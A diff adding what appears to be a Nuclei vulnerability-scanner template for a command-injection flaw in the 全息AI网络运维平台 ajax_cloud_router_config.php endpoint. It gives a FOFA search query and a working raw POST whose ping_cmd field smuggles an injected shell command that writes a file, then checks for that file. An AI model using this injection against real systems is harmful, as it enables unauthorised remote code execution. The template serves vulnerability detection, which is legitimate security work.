@@ -1,0 +1,43 @@
+id: tgnet-ajax_cloud_router_config-rce
+info:
+  name: 全息AI网络运维平台 /nmss/cloud/Ajax/ajax_cloud_router_config.php - rce
+  author: leadlife
+  severity: critical
+  description: 全息AI网络运维平台 接口 /nmss/cloud/Ajax/ajax_cloud_router_config.php 存在命令执行漏洞，导致服务器沦陷。
+  reference: 
+    - https://github.com/wy876/POC/blob/1d1ffb9f40ef425e6558f039fb2296fe4a89b584/%E5%85%A8%E6%81%AFAI%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4%E5%B9%B3%E5%8F%B0ajax_cloud_router_config.php%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="全息AI网络运维平台"
+  tags: rg-net,rce
+
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /nmss/cloud/Ajax/ajax_cloud_router_config.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 34
+
+        ping_cmd=8.8.8.8|echo {{randstr}} > {{filename}}.txt
+      
+      - |
+        GET /nmss/cloud/Ajax/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
